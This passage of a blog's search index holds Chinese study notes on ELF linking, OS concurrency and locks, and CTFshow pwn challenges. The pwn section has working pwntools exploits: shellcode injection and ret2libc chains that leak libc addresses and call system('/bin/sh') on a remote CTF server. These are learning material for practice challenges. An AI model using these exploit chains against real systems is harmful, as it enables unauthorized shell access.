foo;借助符号表跳转，模块化好\n复习一下ELF文件？ 可重定位目标文件 • ELF 头 定义了ELF魔数、版本、小端/大端、操作系统平台、目标文件的类型、机器结构类型、节头表的起始位置和长度等 • .text 节 编译汇编后的代码部分 • .rodata 节 只读数据，如 printf 格式串、switch 跳转表等 • .data 节 已初始化且初值不为0的全局/静态变量 • .bss 节 未初始化或初值为0的全局/静态变量，仅是占位符，不占任何实际磁盘空间。区分bss节是为了空间效率\nQA:为什么bss节不占任何实际磁盘空间？\n只有在运行的时候才会在栈上分配空间去用，不被其他外部文件所访问\nQA：为什么要把程序和指令分开放？\n指令cache可执行不可读不可写，数据cache可读/可写 数据会很多次覆盖，但是指令不会被反复覆盖，下次再次缓存命中，不会因为数据覆盖而指令cache清空 符号解析和重定位 • 确定标号引用关系 • 如何填空？\n因为小端法，y的地址0x2ea5+116f\nstatic链接\n按照相同文件把三个locatable文件组合，外部符号 QA：能否直接用ld链接，如ld a.o b.o?\n不行，没有链接标准库，找不到_start,main等函数\n跑一个.out文件？\n分配一个进程内存，可执行文件与虚拟地址空间间的存储器映像由ABI规范定义\n为什么要动态链接？去掉-fno-pic和static\n占用空间更小\n只用维护表就行\nGOT表 call *table[PRINTF]\n延迟绑定使用PLT表有什么好处？ 只有调用到的函数，才去回填跳转\n1 2 3 4 printf@plt: jmp *table[PRINTF] push $PRINTF call resolve 中断与分时多任务 QA：while(1);是否会把电脑卡死？\n类似于call指令？发生中断处理，再返回ret\n中断处理\n自动保存RIP,CS,RFLAGS,RSP,SS,Error Code 根据中断/异常好跳转到处理程序，特权级切换回触发堆栈切换 int $0x80可以产生128号异常，主动唤起中断\n时钟，键盘32号中断（IDT）\nCLI:Clear Interrupt Flag 关中断，不是给低权限用的，\n系统调用，打断点，int指令都是程序内部引发异常\n一类是可处理，最终还得回到中断发生处next PC，保存现场，恢复现场（分时多任务，时钟中断都是这种）\n而不可恢复的，程序出错，触发ERROR CODE0\nQA:保存现场，恢复现场 什么值？\n","date":"2025-03-17T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/ics-pa%E7%AC%94%E8%AE%B0/","title":"ICS-PA笔记"},{"content":"由于引导区空间有限，只有512个字节，故打算把程序编译成com文件，然后让DOS执行\n1 nasm pmtest1.asm -o pmtest1.com 一些挂载问题：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 1、写入空白内容： dd if=/dev/null of=pm.img bs=512 count=1 conv=notrunc 2、使用 losetup 命令，将 data.img 作为 loop device 使用： sudo losetup /dev/loop0 pm.img 3、然后，格式化这个 loop device： sudo mkfs.msdos /dev/loop0 4、检查文件系统： sudo fsck.msdos /dev/loop0 5、删除 loop device： sudo losetup -d /dev/loop0 这时候，pm.img 已经格式化完成，可以作为一个软盘镜像使用。用file查看，结果为： pm.img: DOS floppy 1440k, x86 hard disk boot sector 再次输入 sudo mount -o loop pm.img /mnt/floppy 6、挂载成功！！！ 之后正常挂在就行\n1 2 3 sudo cp pmtest1.com /mnt/floppy(先要在创建挂载文件夹，Ubuntu好像没有软盘驱动，中途换kali去了，也是基于Debian) sudo umount /mnt/floppy 保护模式 从实模式跳转到保护模式\n1.准备GDT（全局描述符表）\n2.用lgdt加载gdtr\n1 lgdt [GdtPtr] 3.打开A20,，试图访问到1MB上的内存\n4.设置cr0的PE位，0变1\n5.跳转，进入保护模式\n1 jmp dword SelectorCode32:0 跳转目标是描述符DESC——CODE32对应段的首地址，即标号LABEL_SEG_CODE32处\nP位，p=1表示段在内存中存在，p=0表示段在内存中不存在\nDPL描述符特权级，特权级可以是0，1，2，3，数字越小特权级越大\nS位，数据段/代码段描述符，系统段/门描述符\n在保护模式下执行汇编代码mov ds:[si], ax的大致步骤如下：\n首先CPU需要查找GDT在内存中位置，GDT的位置从GDTR寄存器中直接获取 然后根据DS寄存器得到目标段描述符的物理地址 计算出描述符中的段基址的值加上SI寄存器存储的偏移量的结果，该结果为目标物理地址 将AX寄存器中的数据写入到目标物理地址\nC程序的状态机模型 状态=堆+栈\n初始状态=main()的第一条语句\n迁移=执行一条简单语句\n状态机，取指令，执行\n复习下gdb调试，大多数都快忘光了\npwngdb调试：start;b \u0026lt;断点\u0026gt;；r;layout asm(二进制调试);si执行一条指令；x $rbp;si;rbp寄存器值改变；wa $rax监控断点\n程序？\n程序是一个状态机，初始状态：如果没有指定，从PC开始执行，线性，分叉（如rand），程序执行的结果不是唯一的\n一条特殊的指令syscall(),进入内核模式，把\u0026hellip;.交给操作熊，任其修改，程序=计算+syscall()\n如何写一个最小的hello，world程序?\n强行编译+链接\nld失败，把main改成_start\n但是Segmentation Fault，retq就是把rsp加8，调试发现是初始状态无法返回\n解决办法：syscall\n1 2 3 4 5 #include \u0026lt;sys/syscall.h\u0026gt; int main() { syscall(SYS_exit, 42); } man syscall\n系统调用参数，如在x86-64，syscall放在rax,rax,rdx，终于明白pwn的payload如何构造了\n一些有趣的终端命令\n1 2 3 4 5 telnet towel.blinkenlights.nl 放电影 dialog --msgbox \u0026#39;Hello\u0026#39; 8 32 ssh sshtron.zachlatta.com(贪吃蛇) 编译器 c代码状态机（有些地方不可优化，如系统调用是不可优化的），汇编代码状态机，如何切换?\nC=compile(S)\n正确的编译？把C代码中不可优化的部分都被正确的翻译到汇编上\nxxd:Linux查看二进制代码\n常见应用程序 程序是状态机视角\nGNU Coreutils/busybox -\u0026gt;系统/工具程序(apt,ssh,vim) ——\u0026gt;应用程序\nQA：Hello World C程序执行的第一条指令在哪里?\n/lib64/ld-linux-x86-64.so\n可以自行修改哈\n1 2 3 4 5 6 strace追踪 strace f.out strace -f gcc -c f.c gcc --verbose 并发 Human beings are sequential agents\n单线程每一步都是确定的\n多线程：全局变量和堆区共享，有几个独立的栈帧链，线程：每个栈帧里都有PC和其他局部变量，并发系统每一步都不确定，switch选择线程1/2/3\u0026hellip;\u0026hellip;?\nHuman beings are sequential creature.\ntop显示CPU使用情况\n是不是线程共存内存？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026#34;thread.h\u0026#34; int x = 0; void Thello(int id) { usleep(id * 100000); printf(\u0026#34;Hello from thread #%c\\n\u0026#34;, \u0026#34;123456789ABCDEF\u0026#34;[x++]); } int main() { for (int i = 0; i \u0026lt; 10; i++) { create(Thello); } } 改变int x=0局部or全局，可以看到不一样的输出\n如何证明线程具有独立堆栈？\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 #include \u0026#34;thread.h\u0026#34; __thread char *base, *cur; // thread-local variables __thread int id; // objdump to see how thread-local variables are implemented __attribute__((noinline)) void set_cur(void *ptr) { cur = ptr; } __attribute__((noinline)) char *get_cur() { return cur; } void stackoverflow(int n) { set_cur(\u0026amp;n); if (n % 1024 == 0) { int sz = base - get_cur();//栈底和栈顶区别 printf(\u0026#34;Stack size of T%d \u0026gt;= %d KB\\n\u0026#34;, id, sz / 1024); } stackoverflow(n + 1);//无限制的创建栈 } void Tprobe(int tid) { id = tid; base = (void *)\u0026amp;tid; //指向tid地址 stackoverflow(0); } int main() { setbuf(stdout, NULL); for (int i = 0; i \u0026lt; 4; i++) { create(Tprobe); } } 多线程执行，同时访问相同的共享变量，会出问题\n原子性的丧失 如何把程序限制到单处理器上？\n单处理器多线程\n线程在运行时可能被中断，切换到另一个线程执行 多处理器多线程\n线程根本就是并行执行的 printf还能在多线程调用吗？\nprintf不会在多线程中出现问题，比如一个字符插入另一个字符，因为有缓冲区，不是puts\nasm volatile(\u0026quot;\u0026quot;:::\u0026ldquo;memory\u0026rdquo;)插入汇编指令，告诉汇编器不要优化，别的线程可能读写内存\n并发程序最大的麻烦？\nmem-ordering.c\nflag=0或1，通过异或算法，来决定执行哪个\n1 ./mem-ordering |head -n 10000 |sort |uniq -c 现代处理器 动态编译器\n单个处理器把汇编代码编译成更小的uops\nfetch-\u0026gt;issue（可以同时）-\u0026gt;execuite-\u0026gt;commit\n在任何时刻，处理器都维护一个uop的池子，每一周期向池子补充尽可能多的uop，执行尽可能多的uop，这也是乱序执行的原因\n多处理器间即使可见性的丧失\n如果写x发生cache miss，延迟写入，执行下一条指令\n“mfence”保证多处理器之间的一致性，只有写入内存，才能执行下一条语句\n总结 并发程序=多个执行流，共享内存的状态机，c语言执行流\nthread.h=create+join\n并发执行不原子，能乱序。不立即可见\n现代处理器就是动态数据分析器，指令流，数据流，只要做出相应的应对，就能跑的快\n互斥：保证两个线程不能同时执行一段代码\n利用锁，互斥锁，同一时间只有一个线程持有锁，线程在进入临界区前必须先获取锁，线程在离开临界区后必须释放锁，必须确保同一时间只有一个线程能狗执行临界区代码\nPeterson算法 store()改变状态，赋值\nload()看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int x = 0, y = 0, turn = A; void TA() { while (1) { /* PC=1 */ x = 1; /* PC=2 */ turn = B; /* PC=3 */ while (y \u0026amp;\u0026amp; turn == B) ; critical_section(); /* PC=4 */ x = 0; } } void TB() { while (1) { /* PC=1 */ y = 1; /* PC=2 */ turn = A; /* PC=3 */ while (x \u0026amp;\u0026amp; turn == A) ; critical_section(); /* PC=4 */ y = 0; } } QA：如何保证两个人能安全的上厕所，只有store（）和load()两个动作？\n模拟算法（PC1,PC2,X,Y,turn）\nmodef-checker.py\n不断试图进入临界区，只要变量是锁着的，就执行死循环，如果不是，就锁上，进入临界区，出临界区，把锁删掉\n在共享内存上实现互斥 实现互斥的根本困难：公理系统不允许同时读/写共享内存，即load()和store()不能同时执行\n解决：假设硬件能为我们提供一条“瞬间完成”的读写指令\n实现互斥的协议？\n一条exchange协议，0/1状态转变\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 int table =yes; void lock(){ retry: ​ int got = xchg(\u0026amp;table,NOPE); ​ if (got == NOPE) ​ goto retry; ​ assert(got == YES); } void unlock(){ ​ xchg(\u0026amp;table,YES) } int locked =0; void lock(){while (echg(\u0026amp;locked,1));} void unlock(){xchg(\u0026amp;locked,0);} 注意model-checker工作的检验\n原子指令的模型 保证lock指令有顺序并能按顺序执行，后面的线程能看见前面的线程，保证之前的store都写入内存，保证load/store不与原子指令乱序\natomic test-and-set\nlock xchg\nreg=load(x);if (reg==XX){store(x,XX)}\nlock add\nt=load(x);t++;store(x,t)\n一读一写\nload,exec,store\nLOAD-Reserved/Store-Conditional 打标记\n1 2 3 4 5 6 int cas(int *addr, int cmp_val, int new_val) { int old_val = *addr; if (old_val == cmp_val) { *addr = new_val; return 0; } else { return 1; } } 自旋锁的缺陷 每个CPU上不同线程，可以切换，除了进入临界区的线程，其他处理器上的线程都在空转，获得自旋锁的线程可能被操作系统切换出去\n自旋 (共享变量) 会触发处理器间的缓存同步，延迟增加\n同一份计算任务，时间 (CPU cycles) 和空间 (mapped memory) 会随处理器数量的增长而变化。\n自旋锁的好处 更快的 fast path xchg 成功 → 立即进入临界区，开销很小 更慢的 slow path xchg 失败 → 浪费 CPU 自旋等待 自旋锁的使用场景\nno：\n持有自旋锁时禁止执行流切换(很危险的操作)？ 临界区几乎不拥堵？ 操作系统可以操纵关中断和抢占，保证锁的持有者在很短的时间呢你可以释放锁\n如何实现一个很长的临界期？\n把锁的实现放到操作系统里就好啦！\n1 syscall(SYSCALL_lock, \u0026amp;lk); 试图获得 lk，但如果失败，就切换到其他线程 1 syscall(SYSCALL_unlock, \u0026amp;lk); 释放 lk，如果有等待锁的线程就唤醒 融合自旋锁和互斥锁的好处？\nFutex Fast path: 一条原子指令，上锁成功立即返回\nSlow path: 上锁失败，执行系统调用睡眠\n线程库里的锁绝大情况下不会启动系统调用，而是原子调用\n总结 QA：如何在多处理器上实现互斥？\n在多处理器系统上实现互斥是确保多个处理器或核心在访问共享资源时不会发生冲突的关键，利用锁\n并发控制 QA:如何在多处理器上协同多个线程完成任务？\n同步：两个或两个以上随时间变化的量在变化过程中保持一定的相对关系\n并发程序中的同步：在某个时间点共同达到互相已知的状态\n生产者-消费者问题 括号匹配\n左括号：生产资源，放入队列\n右括号：从队列取出资源执行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 #include \u0026#34;thread.h\u0026#34; #include \u0026#34;thread-sync.h\u0026#34; int n, count = 0; mutex_t lk = MUTEX_INIT(); void Tproduce() { while (1) { retry: mutex_lock(\u0026amp;lk); if (count == n) { mutex_unlock(\u0026amp;lk); goto retry; } count++; printf(\u0026#34;(\u0026#34;); mutex_unlock(\u0026amp;lk); } } void Tconsume() { while (1) { retry: mutex_lock(\u0026amp;lk); if (count == 0) { mutex_unlock(\u0026amp;lk); goto retry; } count--; printf(\u0026#34;)\u0026#34;); mutex_unlock(\u0026amp;lk); } } int main(int argc, char *argv[]) { assert(argc == 2); n = atoi(argv[1]); setbuf(stdout, NULL); for (int i = 0; i \u0026lt; 8; i++) { create(Tproduce); create(Tconsume); } } 如果不为空，就取出右括号执行，如果不满，就放左括号\n改进，join()阻塞进程直至线程完成\nConditional Variables 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 #include \u0026#34;thread.h\u0026#34; #include \u0026#34;thread-sync.h\u0026#34; int n, count = 0; mutex_t lk = MUTEX_INIT(); cond_t cv = COND_INIT(); void Tproduce() { while (1) { mutex_lock(\u0026amp;lk); if (count == n) { cond_wait(\u0026amp;cv, \u0026amp;lk); } printf(\u0026#34;(\u0026#34;); count++; cond_signal(\u0026amp;cv); mutex_unlock(\u0026amp;lk); } } void Tconsume() { while (1) { mutex_lock(\u0026amp;lk); if (count == 0) { pthread_cond_wait(\u0026amp;cv, \u0026amp;lk); } printf(\u0026#34;)\u0026#34;); count--; cond_signal(\u0026amp;cv); mutex_unlock(\u0026amp;lk); } } int main(int argc, char *argv[]) { assert(argc == 2); n = atoi(argv[1]); setbuf(stdout, NULL); for (int i = 0; i \u0026lt; 8; i++) { create(Tproduce); create(Tconsume); } } 两个消费者，一个生产者，什么时候会出现问题，应该是一个consumer在不该wakeup的时候？())同类唤醒\nassert()检查\n获取互斥锁，如果不满足条件，则调用cond_wait进入等待状态，并释放互斥锁，满足条件执行后，释放锁，cond_signal()唤醒另一个进程\n哲学家吃饭问题 吃饭需要同时得到左手和右手的叉子 当叉子被其他人占有时，必须等待，如何完成同步？ 如何用互斥锁/信号量实现？ 失败的尝试\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #include \u0026#34;thread.h\u0026#34; #include \u0026#34;thread-sync.h\u0026#34; #define N 3 sem_t locks[N]; void Tphilosopher(int id) { int lhs = (N + id - 1) % N; int rhs = id % N; while (1) { P(\u0026amp;locks[lhs]); //上锁，得到叉子 printf(\u0026#34;T%d Got %d\\n\u0026#34;, id, lhs + 1); P(\u0026amp;locks[rhs]); printf(\u0026#34;T%d Got %d\\n\u0026#34;, id, rhs + 1); V(\u0026amp;locks[lhs]); V(\u0026amp;locks[rhs]); } } int main(int argc, char *argv[]) { for (int i = 0; i \u0026lt; N; i++) { SEM_INIT(\u0026amp;locks[i], 1);//初始化为1 } for (int i = 0; i \u0026lt; N; i++) { create(Tphilosopher); } } 问题：死锁？\n分布式算法：如果所有人叉子都在右手上，没有人叫醒程序，线程不会进展\n1 2 3 4 5 6 7 8 9 10 11 mutex_lock(\u0026amp;mutex); while (!(avail[lhs] \u0026amp;\u0026amp; avail[rhs])) { wait(\u0026amp;cv, \u0026amp;mutex); } avail[lhs] = avail[rhs] = false; //放下两个叉子 mutex_unlock(\u0026amp;mutex); mutex_lock(\u0026amp;mutex); avail[lhs] = avail[rhs] = true; broadcast(\u0026amp;cv); mutex_unlock(\u0026amp;mutex); Master-slave：让一个人管理叉子\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 void Tphilosopher(int id) { send_request(id, EAT); P(allowed[id]); // waiter 会把叉子递给哲学家 philosopher_eat(); send_request(id, DONE); } void Twaiter() { while (1) { (id, status) = receive_request(); if (status == EAT) { ... } if (status == DONE) { ... } } } 延伸思考，如果觉得单线程管理太慢，可以分批给多个线程管理，但这些现成的管理资源要独立\n防御性编程 利用assert()\n1 2 3 CHECK_INT(waitlist-\u0026gt;count, \u0026gt;= 0); CHECK_INT(pid, \u0026lt; MAX_PROCS); CHECK_HEAP(ctx-\u0026gt;rip); CHECK_HEAP(ctx-\u0026gt;cr3); 检查PID，是否在堆区\n死锁：线程互相等待\n","date":"2025-03-16T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/jyy%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","title":"jyy操作系统"},{"content":"gcc hello.c -save-temps \u0026ndash;verbose\n-save-temps保存中间生成文件\n\u0026ndash;verbose查看详细工具流\n预处理 gcc -E hello.c -o hello.i\n编译 gcc -S hello.c -o hello.s\n汇编 gcc -c hello.s -o hello.o\n重定向文件\n反汇编\nobjdump -sd hello.o -M intel\n链接 gcc hello.o -o hello -static\n默认动态，-static指定静态链接\nobjdump -sd hello -M intel\n-M intel\n指定反汇编的输出格式为 Intel 语法（而不是默认的 AT\u0026amp;T 语法）。 Intel 语法是汇编语言的一种常见格式，通常更易于阅读。 -s 选项\n显示文件的完整内容（包括十六进制和 ASCII 表示）。 例如，它会显示每个段的十六进制数据以及对应的 ASCII 字符。 -d 选项\n反汇编文件中的可执行代码段。 例如，它会将二进制代码转换为汇编指令。 ELF文件 可执行文件.exec\n可重定位文件，尚未链接 .rel\n共享目标文件：动态链接库文件.dyc\n结构 文件头 节头表 .text\n.data\n.bss\n可执行文件的装载 运行一个可执行文件时，需要将该文件和动态链接库装载到进程空间中，形成一个进程镜像，每个进程都拥有独立的虚拟地址空间，这个空间日和布局是由记录在段头表的程序头决定的\n地址空间分配 相似节合并\n静态链接的详细过程 符号解析：每个符号（函数，变量）与定义关联\n重定位：每个符号定义与内存地址关联\n静态链接库：.a\n动态链接 在运行或加载时，在内存中完成链接的过程，用于动态连接的系统库叫共享库\n如funcq.elf和func2.elf不再包含单独的testlib.o，运行func1.elf时，系统将func1.elf和依赖的testlib.o装载如内存，然后进行动态链接，完成后系统将控制权交给程序入口点，当func2.elf想要执行时，由于内存中已经有testlib.o,因此不再重复加载\nStack Canaries canary的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的地方，攻击者要想控制函数的返回指针，就一定要先覆盖到canary,如果被改变，则认为是发生了栈溢出\ngcc默认使用stack canary保护，关闭方法加入“-fno-stack-protector”\nNX 开启NX保护不能直接使用shellcode执行任意代码，gcc默认开启，关闭方法加-z execstack\nASLR 将程序的堆栈地址和动态链接库的加载地址进行一定的随机化，这些地址之间是不可读写执行的未映射内存，降低攻击者对程序内存结构的了解程序\n关闭方式，修改/proc/sys/kernel/randomize_va_space文件的内容为0\nPIE 让ELF地址随机化加载，使得程序的内存结构对攻击者未知，进一步提高程序的安全性\n开启-fpic-pie\n关闭-no-pie\nFull Relro 开启“-z relro”\n.GOT.PLT和.PLT的作用 一个程序想调用动态链接库中的函数，必须使用.GOT.PLT和.PLT配合完成调用\n.PLT表是一段代码，从内存中取出一个地址然后跳转\n.GOT.PLT表存放实际地址\n由于Linux的Lazy binding机制，没有开启Full Rello的ELF种，某个函数必须被调用，.GOT.PLT表才会存放函数的真实地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 int __cdecl main(int argc, const char **argv, const char **envp)`: 这是 `main` 函数的定义，它接受三个参数，分别是程序的参数数量 `argc`、参数列表 `argv` 和环境变量 `envp v6 = __readfsqword(0x28u);: 这一行读取了 FS 寄存器偏移 0x28 处的值并存储到 v6 中 setvbuf(_bss_start, 0LL, 2, 0LL); 和 setvbuf(stdin, 0LL, 2, 0LL);: 这两行调用了 setvbuf 函数，用于设置缓冲区类型。第一个调用将 _bss_start 的缓冲区类型设置为无缓冲，第二个调用将标准输入的缓冲区类型设置为无缓冲。 strcpy(s1, \u0026#34;CTFshowPWN\u0026#34;);: 这行将字符串 \u0026#34;CTFshowPWN\u0026#34; 复制到 s1 数组中 if ( !strcmp(s1, s2) ) execve_func();: 这行使用 strcmp 函数比较 s1 和 s2 是否相等，如果相等，则调用 execve_func 函数。 setvbuf: 这个函数用于设置文件流的缓冲区类型。它允许程序员控制标准 I/O 库中文件流的缓冲方式。通常，我们可以将文件流设置为无缓冲、行缓冲或全缓冲。在这个代码中，setvbuf 函数被用于设置 _bss_start 和标准输入流 stdin 的缓冲类型为无缓冲，这意味着每次输出都会立即被写入，而不会先缓存在内存中。 strcpy: 这个函数用于将一个字符串复制到另一个字符串数组中。它接受两个参数，第一个参数是目标字符串数组，第二个参数是源字符串。strcpy 会将源字符串的内容逐个字符地复制到目标字符串数组中，直到遇到源字符串的结束符 \\0。 puts: puts 函数用于向标准输出打印字符串，并在最后自动添加一个换行符 \\n。它接受一个字符串作为参数，并将其打印到标准输出流中。 scanf: 这个函数用于从标准输入流中读取输入。它接受格式化字符串作为第一个参数，用于指定输入的格式，以及一系列指向变量的指针，用于存储读取到的值。在这个代码中，scanf 被用于从标准输入中读取一个字符串，并将其存储到 s2 字符数组中。 strcmp: 这个函数用于比较两个字符串是否相等。它接受两个字符串作为参数，并返回一个整数值，如果两个字符串相等则返回0，否则返回它们第一个不相等字符的 ASCII 差值。在这个代码中，strcmp 用于比较 s1 和 s2 是否相等，如果相等则返回0，程序将执行 execve_func 函数。 execve(\u0026#34;/bin/sh\u0026#34;, argv, 0LL);: 这一行调用了 execve 函数，用于执行一个程序。它接受三个参数，分别是要执行的程序路径、参数列表和环境变量列表。在这里，它执行了 /bin/sh，并传递了一个空的参数列表和环境变量列表，表示没有额外的参数和环境变量。 IDA转换数据：C（转换为代码）、D（转换为数据）、A（转换为字符）、N（为标签重命名)\nchecksec查看文件信息\nread()读取\nstrcat()赋值\nsystem()调用\necho\u0026raquo;在文件后面追加内容\necho\u0026gt;覆盖文件\nfork()创建了子进程，fclose(_bss_star)关闭了输出流，即使后面再输入，也不会有回显，在命令后加上\u0026gt;\u0026amp;0 ，将命令的输出重定向到标准输入，也就是将命令的输出内容发送到与终端或键盘关联的地方\n链接重定位 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 .text ... // 调用printf的call指令 call printf_stub ... printf_stub: mov rax, [printf函数的储存地址] // 获取printf重定位之后的地址 jmp rax // 跳过去执行printf函数 .data ... printf函数的储存地址： 这里储存printf函数重定位后的地址 .got和.got.plt是否可写与RELRO有关，这是linux系统下可执行文件的一种保护机制，它用于增强程序的安全性，特别是针对共享库的攻击。RELRO机制通过将部分ELF段标记为只读，防止攻击者利用全局偏移表（GOT）和过程链接表（PLT）进行攻击。规定如下：\n当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。 当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。 当RELRO为No RELRO时，表示.got与.got.plt都可写。\n可以通过checksec命令来获取可执行文件的部分保护机制信息。\n可以通过readelf -S命令查看文件的各个段的详细信息，其中就包括了.got和.got.plt表的地址 用objdump -h pwn命令查看elf头信息，VMA即地址（虚拟地址和物理地址相同)\n只要传参src，长度大于0x3Eh+0x4就会发生溢出,使用./(file)传参\npwn24 调用read函数，读取输入，存入[ebp+buf]中，lea eax [ebp+buf]把地址存入eax中，然后，call eax执行\nNX是disables，说明可以用shellcode进行攻击\n1 2 3 4 5 from pwn import * p=remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;,28284)#与服务器的pwn文件建立联系 shell=asm(shellcraft.sh())#利用shellcraft模块生成调用系统shell（/bin/sh）的shellcode。这个shellcode可以用于执行命令行命令 p.sendline(shell)#向远程发送shellcode p.interactive()#建立交互式对话 就获得控制台权限了\npwn25 ret2libc\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * from LibcSearcher import * context.log_level = \u0026#39;debug\u0026#39; p = remote(\u0026#39;pwn.challenge.ctf.show\u0026#39;,28162) elf = ELF(\u0026#39;pwn1\u0026#39;) offset = 0x88 + 0x4 puts_plt = elf.symbols[\u0026#39;puts\u0026#39;] puts_got = elf.got[\u0026#39;puts\u0026#39;] main = elf.symbols[\u0026#39;main\u0026#39;] # payload：0x88+0x4个无用填充字符覆盖到返回地址， # 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数， # main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞 # puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址 payload = b\u0026#39;a\u0026#39; * offset + p32(puts_plt) + p32(main) + p32(puts_got) p.sendline(payload) # 接收puts函数输出的puts函数在内存的地址 puts_addr = u32(p.recv()[0:4]) print(hex(puts_addr)) # 在根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址 libc = LibcSearcher(\u0026#34;puts\u0026#34;,puts_addr) # 找到libc中的puts函数地址之后，将内存的puts函数地址减去libc中的puts函数地址就得到了libc的基地址 libc_base = puts_addr - libc.dump(\u0026#34;puts\u0026#34;) print(hex(libc_base)) # 使用libc.dump(\u0026#34;system\u0026#34;)找到libc中的system函数地址，再加上基地址就得到system函数在内存的地址 system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # 使用libc.dump(\u0026#34;str_bin_sh\u0026#34;)找到libc中的\u0026#34;/bin/sh\u0026#34;字符串地址，再加上基地址就得到\u0026#34;/bin/sh\u0026#34;字符串在内存的地址 binsh_addr = libc_base + libc.dump(\u0026#34;str_bin_sh\u0026#34;) # payload：填充栈空间到返回地址，将返回地址覆盖为system函数的地址 # 然后填充执行system函数之后的返回地址，填充什么都可以，但是长度必须为4 # 最后填入system的参数“/bin/sh” payload = offset * b\u0026#39;a\u0026#39; + p32(system_addr) + b\u0026#39;a\u0026#39; * 4 + p32(binsh_addr) p.sendline(payload) p.recv() p.interactive() pwn26 SLR（Address Space Layout Randomization）是一种计算机安全机制，旨在增加恶意攻击者在系统上成功执行攻击的难度。ASLR通过随机化进程的地址空间布局来防止攻击者依赖于已知的内存地址，从而增加了攻击的复杂性。ASLR可以随机化以下组件的位置：\n栈：包含函数调用和局部变量的区域。 堆：用于动态分配内存的区域。 共享库：动态链接的共享库的加载地址。 代码段：包含程序指令的区域。 在 Linux 系统中，/proc/sys/kernel/randomize_va_space 是一个控制和查看ASLR的接口文件。\n/proc/sys/kernel/randomize_va_space 可以具有以下值：\n0：表示 ASLR 被禁用。在这种情况下，进程的地址空间将不会随机化，各个组件的地址位置将是固定的。\n1：表示 ASLR 已启用，但只会对共享库的地址进行随机化。即在每次运行时，共享库的加载地址会发生变化，而进程的栈、堆和代码段的地址位置仍然是固定的。\n2：表示 ASLR 已启用，对进程的地址空间中的所有组件（包括栈、堆、共享库和代码段）进行完全随机化。这是最安全的设置，因为每次运行时，进程的所有组件的地址位置都会发生变化。\npwn29 PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，大大增加了利用难度。然而在增加安全性的同时，PIE也会一定程度上影响性能，因此在大多数操作系统上PIE仅用于一些对安全性要求比较高的程序。 可以看到executable:后面输出的是main函数的地址，由于PIE保护，已经发生了变化\npwn30 溢出漏洞，用ret2libc,用于绕过栈溢出漏洞等缓冲区溢出漏洞的防御措施（比如NX防御机制），以实现代码执行或提升攻击者权限。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 from pwn import * from LibcSearcher import * # 打印调试信息 context.log_level = \u0026#39;debug\u0026#39; # 建立连接 p = remote(\u0026#34;pwn.challenge.ctf.show\u0026#34;, \u0026#34;28309\u0026#34;) elf = ELF(\u0026#34;./pwn\u0026#34;) # 溢出偏移地址 offset = 0x88 + 0x4 # main函数地址 main_addr = elf.symbols[\u0026#39;main\u0026#39;] # plt表中puts函数地址 puts_plt = elf.plt[\u0026#39;puts\u0026#39;] # got表中puts函数的地址 puts_got = elf.got[\u0026#39;puts\u0026#39;] # payload：0x88+0x4个无用填充字符覆盖到返回地址， # 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数， # main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞 # puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址 payload = offset * b\u0026#39;a\u0026#39; + p32(puts_plt) + p32(main_addr) + p32(puts_got) # 发送payload p.sendline(payload) # 接收puts函数输出的puts函数在内存的地址 puts_addr = u32(p.recv()[0:4]) print(hex(puts_addr)) # 根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址 libc = LibcSearcher(\u0026#34;puts\u0026#34;, puts_addr) # 找到libc中的puts函数地址之后，将内存的puts函数地址减去libc中的puts函数地址就得到了libc的基地址 libc_base = puts_addr - libc.dump(\u0026#34;puts\u0026#34;) print(hex(libc_base)) # 使用libc.dump(\u0026#34;system\u0026#34;)找到libc中的system函数地址，再加上基地址就得到system函数在内存的地址 system_addr = libc_base + libc.dump(\u0026#34;system\u0026#34;) # 使用libc.dump(\u0026#34;str_bin_sh\u0026#34;)找到libc中的\u0026#34;/bin/sh\u0026#34;字符串地址，再加上基地址就得到\u0026#34;/bin/sh\u0026#34;字符串在内存的地址 binsh_addr = libc_base + 